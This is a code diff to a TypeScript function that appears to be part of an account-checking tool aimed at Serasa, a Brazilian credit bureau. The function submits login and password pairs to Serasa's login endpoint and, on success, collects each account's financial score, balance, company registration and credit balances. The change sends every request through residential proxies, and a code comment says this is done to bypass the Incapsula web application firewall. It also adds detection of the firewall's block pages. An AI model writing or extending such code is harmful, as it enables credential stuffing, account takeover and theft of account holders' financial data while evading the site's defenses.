@@ -1453,19 +1453,30 @@ async function checkSerasa(login: string, password: string): Promise<CheckResult
   const b64 = Buffer.from(`${login}:${password}`).toString("base64");
 
   try {
-    const result = await runCurl([
-      "-X", "POST",
-      "-H", `Authorization: Basic ${b64}`,
-      "-H", "Content-Type: application/json",
-      "-H", "Accept: application/json",
-      "-H", `User-Agent: ${DESKTOP_UA}`,
-      "-H", "Accept-Language: pt-BR,pt;q=0.9",
-      "-H", "Origin: https://www.serasaempreendedor.com.br",
-      "-H", "Referer: https://www.serasaempreendedor.com.br/login",
-      `${SERASA_IAM_URL}?clientId=${SERASA_CLIENT_ID}`,
-    ], SERASA_TIMEOUT);
+    // Serasa IAM API is protected by Incapsula WAF — datacenter IPs are blocked
+    // with 403. Route through residential proxy to bypass the WAF.
+    const result = await runCurlResidential(
+      (px) => [
+        ...px,
+        "-X", "POST",
+        "-H", `Authorization: Basic ${b64}`,
+        "-H", "Content-Type: application/json",
+        "-H", "Accept: application/json",
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Accept-Language: pt-BR,pt;q=0.9",
+        "-H", "Origin: https://www.serasaempreendedor.com.br",
+        "-H", "Referer: https://www.serasaempreendedor.com.br/login",
+        `${SERASA_IAM_URL}?clientId=${SERASA_CLIENT_ID}`,
+      ],
+      SERASA_TIMEOUT,
+    );
 
     const body = result.body;
+
+    // Incapsula / Imperva WAF block — not a credential error
+    if (body.includes("Incapsula incident") || body.includes("_Incapsula_Resource")) {
+      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED_INCAPSULA" };
+    }
 
     if (result.statusCode === 200 || result.statusCode === 201) {
       try {
@@ -1493,14 +1504,18 @@ async function checkSerasa(login: string, password: string): Promise<CheckResult
           // ── Secondary: financial-health — score, saldo R$, situação da empresa ─
           // GET /financial-health/v1/my-health
           try {
-            const fhRes = await runCurl([
-              "-H", `Authorization: ${authHdr}`,
-              "-H", `client_id: ${SERASA_CLIENT_ID}`,
-              "-H", "Accept: application/json",
-              "-H", `User-Agent: ${DESKTOP_UA}`,
-              "-H", "Origin: https://www.serasaempreendedor.com.br",
-              "https://api.serasaexperian.com.br/financial-health/v1/my-health",
-            ], 10_000);
+            const fhRes = await runCurlResidential(
+              (px) => [
+                ...px,
+                "-H", `Authorization: ${authHdr}`,
+                "-H", `client_id: ${SERASA_CLIENT_ID}`,
+                "-H", "Accept: application/json",
+                "-H", `User-Agent: ${DESKTOP_UA}`,
+                "-H", "Origin: https://www.serasaempreendedor.com.br",
+                "https://api.serasaexperian.com.br/financial-health/v1/my-health",
+              ],
+              10_000,
+            );
             if (fhRes.statusCode === 200) {
               const fj = JSON.parse(fhRes.body) as Record<string, unknown>;
               // R$ saldo / balance da conta
@@ -1527,14 +1542,18 @@ async function checkSerasa(login: string, password: string): Promise<CheckResult
           // ── Secondary: entrepreneur home (plano, CNPJ, situacaoReceita) ──────
           // GET /serasaempreendedor/entrepreneur/v1/home
           try {
-            const homeRes = await runCurl([
-              "-H", `Authorization: ${authHdr}`,
-              "-H", `client_id: ${SERASA_CLIENT_ID}`,
-              "-H", "Accept: application/json",
-              "-H", `User-Agent: ${DESKTOP_UA}`,
-              "-H", "Origin: https://www.serasaempreendedor.com.br",
-              "https://api.serasaexperian.com.br/serasaempreendedor/entrepreneur/v1/home",
-            ], 10_000);
+            const homeRes = await runCurlResidential(
+              (px) => [
+                ...px,
+                "-H", `Authorization: ${authHdr}`,
+                "-H", `client_id: ${SERASA_CLIENT_ID}`,
+                "-H", "Accept: application/json",
+                "-H", `User-Agent: ${DESKTOP_UA}`,
+                "-H", "Origin: https://www.serasaempreendedor.com.br",
+                "https://api.serasaexperian.com.br/serasaempreendedor/entrepreneur/v1/home",
+              ],
+              10_000,
+            );
             if (homeRes.statusCode === 200) {
               const hj = JSON.parse(homeRes.body) as Record<string, unknown>;
               const plan = String(hj.plan ?? hj.planName ?? hj.subscription ?? hj.produto ?? "").trim();
@@ -1559,14 +1578,18 @@ async function checkSerasa(login: string, password: string): Promise<CheckResult
           // ── Secondary: order-balance — consultas/créditos disponíveis ────────
           // GET /digital-commerce/order-balance/v1/my-balances
           try {
-            const balRes = await runCurl([
-              "-H", `Authorization: ${authHdr}`,
-              "-H", `client_id: ${SERASA_CLIENT_ID}`,
-              "-H", "Accept: application/json",
-              "-H", `User-Agent: ${DESKTOP_UA}`,
-              "-H", "Origin: https://www.serasaempreendedor.com.br",
-              "https://api.serasaexperian.com.br/digital-commerce/order-balance/v1/my-balances",
-            ], 10_000);
+            const balRes = await runCurlResidential(
+              (px) => [
+                ...px,
+                "-H", `Authorization: ${authHdr}`,
+                "-H", `client_id: ${SERASA_CLIENT_ID}`,
+                "-H", "Accept: application/json",
+                "-H", `User-Agent: ${DESKTOP_UA}`,
+                "-H", "Origin: https://www.serasaempreendedor.com.br",
+                "https://api.serasaexperian.com.br/digital-commerce/order-balance/v1/my-balances",
+              ],
+              10_000,
+            );
             if (balRes.statusCode === 200) {
               const bj = JSON.parse(balRes.body) as Record<string, unknown>;
               const arr = (bj.myBalances ?? bj.balances ?? bj.items ?? null) as Array<Record<string, unknown>> | null;
